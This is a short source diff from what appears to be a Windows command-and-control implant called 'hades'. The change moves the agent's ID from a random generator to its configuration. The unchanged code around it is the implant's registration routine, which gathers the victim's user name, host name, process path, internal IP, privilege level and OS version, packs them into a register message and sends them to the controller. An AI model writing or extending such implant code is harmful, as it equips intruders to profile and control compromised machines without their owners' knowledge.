@@ -20,11 +20,11 @@ BOOL GetVer(DWORD* major, DWORD* minor, DWORD* build) {
 }
 
 
-ULONG GenID() {
-	ULONG S = hades->WinApis.GetTickCount();
-	ULONG id = hades->NtApis.RtlRandomEx(&S);
-	return id;
-}
+// ULONG GenID() {
+// 	ULONG S = hades->WinApis.GetTickCount();
+// 	ULONG id = hades->NtApis.RtlRandomEx(&S);
+// 	return id;
+// }
 
 
 PBYTE CollectProcessPath(DWORD* out) {
@@ -104,6 +104,9 @@ BOOL IsElevated() {
 }
 
 
+
+
+// todo: fix this, returns first IP not real one in most cases
 PBYTE GetInternalIP(DWORD* out) {
 	ULONG BufLen = 0;
 	PIP_ADAPTER_INFO adapter = NULL;
@@ -154,15 +157,9 @@ BOOL InitAgent() {
 	if (!LoadConfig()) { return FALSE; }
 
 
-
-
-
-
-
-
 	DWORD UserLen, HostLen, DomainLen, ProcessPathLen, IpLen, Major, Minor, Build;;
 
-	ULONG HadesID = GenID();
+
 	PBYTE User = CollectUser(&UserLen);
 	PBYTE Host = CollectHost(&HostLen);
 	PBYTE ProcessPath = CollectProcessPath(&ProcessPathLen);
@@ -174,7 +171,7 @@ BOOL InitAgent() {
 	BOOL Arch = (sizeof(void*) != 4);
 	BOOL IsElev = IsElevated();
 	GetVer(&Major, &Minor, &Build);
-	*g_Network = Network(HadesID);
+	*g_Network = Network();
 
 
 
@@ -200,7 +197,7 @@ BOOL InitAgent() {
 		[Build]			  4 BYTES*/
 	g_ByteMgr->InitWrite();
 	g_ByteMgr->Write4(MSG_REGISTER);
-	g_ByteMgr->Write4(HadesID);
+	g_ByteMgr->Write4(hades->config->HadesID);
 	g_ByteMgr->Write4(UserLen);
 	g_ByteMgr->WriteString(User, UserLen);
 	g_ByteMgr->Write4(HostLen);
@@ -218,10 +215,6 @@ BOOL InitAgent() {
 	g_ByteMgr->Write4(Major);
 	g_ByteMgr->Write4(Build);
 	g_Network->RegisterClient(g_ByteMgr->OutData, g_ByteMgr->WriteIndex);
-
-
-
-
 
 
 	if (User) { HeapFree(GetProcessHeap(), 0, User); }
